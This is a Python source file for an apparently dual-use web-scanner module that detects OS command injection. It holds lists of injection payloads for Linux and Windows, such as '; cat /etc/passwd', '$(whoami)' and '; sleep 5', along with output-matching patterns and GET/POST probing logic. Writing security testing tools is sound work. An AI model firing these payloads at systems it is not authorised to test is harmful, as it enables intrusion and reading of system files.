"""
Command Injection Detector
Detects OS command injection vulnerabilities using both output-based and time-based blind techniques
"""

import re
import time
import logging

logger = logging.getLogger(__name__)


class CommandInjectionDetector:
    """Detect OS command injection vulnerabilities
    
    Tests for command injection using:
    1. Output-based detection (command output in response)
    2. Time-based blind injection (sleep/delay commands)
    """
    
    # Linux/Unix command injection payloads
    LINUX_PAYLOADS = [
        "; whoami",
        "| whoami",
        "|| whoami",
        "& whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "; uname -a",
        "| uname -a",
        "\n whoami",
        "\r\n whoami",
    ]
    
    # Windows command injection payloads
    WINDOWS_PAYLOADS = [
        "& whoami",
        "&& whoami",
        "| whoami",
        "|| whoami",
        "; whoami",
        "\n whoami",
        "& ipconfig",
        "| ipconfig",
        "& dir",
        "| dir",
    ]
    
    # Time-based blind command injection (Linux)
    TIME_BASED_LINUX = [
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5 ||",
        "& sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]
    
    # Time-based blind command injection (Windows)
    TIME_BASED_WINDOWS = [
        "& timeout 5",
        "| timeout 5",
        "&& timeout 5",
        "|| timeout 5",
        "; timeout 5",
    ]
    
    # Quick mode payloads (most reliable)
    QUICK_PAYLOADS = [
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "& whoami",
    ]
    
    # Command output indicators (Linux)
    LINUX_INDICATORS = [
        r'\broot\b',
        r'\buid=\d+',
        r'\bgid=\d+',
        r'root:x:0:0:',
        r'daemon:',
        r'Linux',
        r'GNU',
        r'\bwww-data\b',
        r'\bnobody\b',
        r'\bapache\b',
        r'\bnginx\b',
    ]
    
    # Command output indicators (Windows)
    WINDOWS_INDICATORS = [
        r'Windows',
        r'Microsoft',
        r'C:\\\\',
        r'Volume Serial Number',
        r'Directory of',
        r'\bPATH=',
        r'Ethernet adapter',
        r'IPv4 Address',
    ]
    
    # Generic command output patterns
    GENERIC_INDICATORS = [
        r'uid=\d+\(.*?\)',  # id output
        r'gid=\d+\(.*?\)',
        r'groups=\d+\(.*?\)',
    ]
    
    # Common parameter names for command execution
    COMMON_PARAMS = [
        'cmd', 'command', 'exec', 'execute', 'run', 'system',
        'shell', 'process', 'ping', 'host', 'ip', 'domain',
        'url', 'search', 'file', 'path', 'dir'
    ]
    
    def __init__(self, client, quick_mode=False):
        """Initialize command injection detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, skip time-based tests for speed
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"Command Injection Detector initialized (quick_mode={quick_mode})")
        self.time_delay_threshold = 4.0  # seconds
    
    def test(self, path, param=None):
        """Test endpoint for command injection"""
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # Reduce params in quick mode
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]
        
        for test_param in params_to_test:
            # Test Linux command injection
            result = self._test_command_output(path, test_param, 'linux')
            if result:
                return result
            
            # Test Windows command injection
            result = self._test_command_output(path, test_param, 'windows')
            if result:
                return result
            
            # Test time-based blind injection (skip in quick mode)
            if not self.quick_mode:
                result = self._test_time_based(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_command_output(self, path, param, os_type):
        """Test for command output in response"""
        if os_type == 'linux':
            payloads = self.QUICK_PAYLOADS[:3] if self.quick_mode else self.LINUX_PAYLOADS
            indicators = self.LINUX_INDICATORS + self.GENERIC_INDICATORS
            os_name = "Linux/Unix"
        else:
            payloads = [self.QUICK_PAYLOADS[3]] if self.quick_mode else self.WINDOWS_PAYLOADS
            indicators = self.WINDOWS_INDICATORS
            os_name = "Windows"
        
        for payload in payloads:
            try:
                # Baseline request
                baseline = self.client.get(path, params={param: "test123"})
                baseline_text = baseline.text.lower() if baseline and baseline.text else ""
                
                # Test request with payload
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text if res.text else ""
                response_lower = response_text.lower()
                
                # Check for command output indicators
                for indicator in indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        # Make sure it's not in the baseline
                        if not re.search(indicator, baseline_text, re.IGNORECASE):
                            return {
                                "type": "command_injection",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "evidence": f"Command output detected: {indicator}",
                                "os_type": os_name,
                                "confidence": 0.95,
                                "severity": "critical",
                                "description": f"OS command injection allows executing {os_name} commands"
                            }
                
                # Check for command error messages
                error_indicators = [
                    'command not found',
                    'is not recognized as an internal or external command',
                    'cannot find the path specified',
                    'syntax error near unexpected token',
                    'sh: ',
                    'bash: ',
                    'cmd.exe',
                ]
                
                for error in error_indicators:
                    if error in response_lower and error not in baseline_text:
                        return {
                            "type": "command_injection",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Command execution error: {error}",
                            "os_type": os_name,
                            "confidence": 0.75,
                            "severity": "high",
                            "description": "Possible command injection - command execution errors exposed"
                        }
                
                # Try POST request as well
                res_post = self.client.post(path, data={param: payload})
                if res_post and res_post.text:
                    response_text_post = res_post.text
                    for indicator in indicators:
                        if re.search(indicator, response_text_post, re.IGNORECASE):
                            if baseline and baseline.text:
                                if not re.search(indicator, baseline.text, re.IGNORECASE):
                                    return {
                                        "type": "command_injection",
                                        "endpoint": path,
                                        "param": param,
                                        "payload": payload,
                                        "method": "POST",
                                        "evidence": f"Command output via POST: {indicator}",
                                        "os_type": os_name,
                                        "confidence": 0.95,
                                        "severity": "critical"
                                    }
            
            except Exception as e:
                logger.debug(f"Command injection test error: {e}")
                continue
        
        return None
    
    def _test_time_based(self, path, param):
        """Test time-based blind command injection"""
        # Baseline timing
        baseline_start = time.time()
        baseline = self.client.get(path, params={param: "test123"})
        baseline_time = time.time() - baseline_start
        
        if not baseline:
            return None
        
        # Test Linux sleep
        for payload in self.TIME_BASED_LINUX[:3]:  # Test only first 3 to save time
            try:
                start_time = time.time()
                res = self.client.get(path, params={param: payload})
                elapsed = time.time() - start_time
                
                # If response takes significantly longer (at least 4 seconds more)
                if elapsed > (baseline_time + self.time_delay_threshold):
                    return {
                        "type": "command_injection",
                        "subtype": "time_based_blind",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Response delayed by {elapsed:.2f} seconds (baseline: {baseline_time:.2f}s)",
                        "os_type": "Linux/Unix",
                        "confidence": 0.85,
                        "severity": "critical",
                        "description": "Time-based blind command injection detected"
                    }
            
            except Exception:
                continue
        
        # Test Windows timeout
        for payload in self.TIME_BASED_WINDOWS[:3]:
            try:
                start_time = time.time()
                res = self.client.get(path, params={param: payload})
                elapsed = time.time() - start_time
                
                if elapsed > (baseline_time + self.time_delay_threshold):
                    return {
                        "type": "command_injection",
                        "subtype": "time_based_blind",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Response delayed by {elapsed:.2f} seconds (baseline: {baseline_time:.2f}s)",
                        "os_type": "Windows",
                        "confidence": 0.85,
                        "severity": "critical",
                        "description": "Time-based blind command injection detected"
                    }
            
            except Exception:
                continue
        
        return None
